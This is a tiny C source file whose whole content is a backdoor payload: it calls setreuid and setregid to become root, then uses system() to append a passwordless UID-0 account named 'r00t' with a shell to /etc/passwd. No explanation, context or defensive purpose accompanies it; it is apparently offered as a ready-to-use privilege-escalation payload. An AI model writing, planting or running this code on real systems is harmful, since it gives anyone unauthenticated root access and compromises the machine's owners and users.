#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
        setreuid(0,0);
        setregid(0,0);
        system("echo r00t::0:0::/:/bin/sh >> /etc/passwd");
        exit(0);
}
